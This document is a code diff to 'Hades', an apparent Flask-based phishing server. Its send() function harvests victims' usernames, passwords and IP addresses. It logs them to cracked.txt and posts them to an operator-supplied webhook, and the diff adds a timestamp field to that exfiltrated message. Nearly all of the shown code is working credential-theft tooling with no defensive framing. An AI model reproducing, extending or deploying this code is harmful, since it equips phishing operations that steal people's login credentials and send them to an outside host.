@@ -46,7 +46,6 @@ log.setLevel(logging.ERROR)
 app = Flask("Hades")
 
 
-
 def send(args: str, ip: str):
 
     fields = []
@@ -98,18 +97,26 @@ def send(args: str, ip: str):
             "embeds": embeds}
 
     n = datetime.now()
-    date = f"{n.hour}h {n.minute}m {n.second}s | {n.day}/{n.month}/{n.year}"
+    date = f"{n.hour}h {n.minute}m {n.second}s - {n.day}/{n.month}/{n.year}"
 
-    if len(fields) != 1:
-        print(Colorate.Horizontal(Colors.red_to_blue, f"\nPhished -> {date}\nUsername: {username}\nPassword: {password}\nIP: {ip}\n\n"))
+    fields.append(
+        {
+            "name": "Time:",
+            "value": f"`{date}`"
+        })
+
+    if len(fields) != 2:
+        print(Colorate.Horizontal(Colors.red_to_blue,
+              f"\nPhished -> {date}\nUsername: {username}\nPassword: {password}\nIP: {ip}\n\n"))
         if logfile:
             with open('cracked.txt', 'a', encoding='utf-8') as f:
-                f.write("Username: " + username + '\nPassword: ' + password + '\nIP: ' + ip + '\n\n')
+                f.write("Username: " + username + '\nPassword: ' +
+                        password + '\nIP: ' + ip + '\n\n')
         if webhook:
             post(webhook, json=data)
     else:
-        print(Colorate.Horizontal(Colors.red_to_blue, f"\nLogged -> {date}\nIP: {ip}\n\n"))
-
+        print(Colorate.Horizontal(Colors.red_to_blue,
+              f"\nLogged -> {date}\nIP: {ip}\n\n"))
 
 
 @app.route('/')
@@ -120,7 +127,6 @@ def main_route():
         return f.read()
 
 
-
 def main():
     global webhook, logfile
 
@@ -129,7 +135,8 @@ def main():
     print()
     print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(mode)))
     print('\n'*3)
-    port = Write.Input("Enter the port (press 'enter' for '8080') -> ", Colors.red_to_purple, interval=0.0025)
+    port = Write.Input("Enter the port (press 'enter' for '8080') -> ",
+                       Colors.red_to_purple, interval=0.0025)
     if port == '':
         port = "8080"
     try:
@@ -137,21 +144,24 @@ def main():
     except ValueError:
         Colorate.Error("Error! Port has to be an integer.")
         return
-    host = Write.Input("Enter the host (press 'enter' for '127.0.0.1') -> ", Colors.red_to_purple, interval=0.0025)
+    host = Write.Input("Enter the host (press 'enter' for '127.0.0.1') -> ",
+                       Colors.red_to_purple, interval=0.0025)
     if host == '':
         host = "127.0.0.1"
     print()
-    webhook = Write.Input("Enter your webhook (press 'enter' to pass) -> ", Colors.red_to_purple, interval=0.0025)
-    logfile = Write.Input("Stock the logs in a file [y/n] -> ", Colors.red_to_purple, interval=0.0025)
+    webhook = Write.Input("Enter your webhook (press 'enter' to pass) -> ",
+                          Colors.red_to_purple, interval=0.0025)
+    logfile = Write.Input(
+        "Stock the logs in a file [y/n] -> ", Colors.red_to_purple, interval=0.0025)
     logfile = logfile == "y"
     System.Clear()
     print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(hades)))
     print()
     print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(mode)))
     print('\n'*2)
-    print(Colorate.Color(Colors.purple, f"   Running on: http://{host}:{port}"))
+    print(Colorate.Color(Colors.purple,
+          f"   Running on: http://{host}:{port}"))
     app.run(host=host, port=port)
-
 
 
 if __name__ == '__main__':
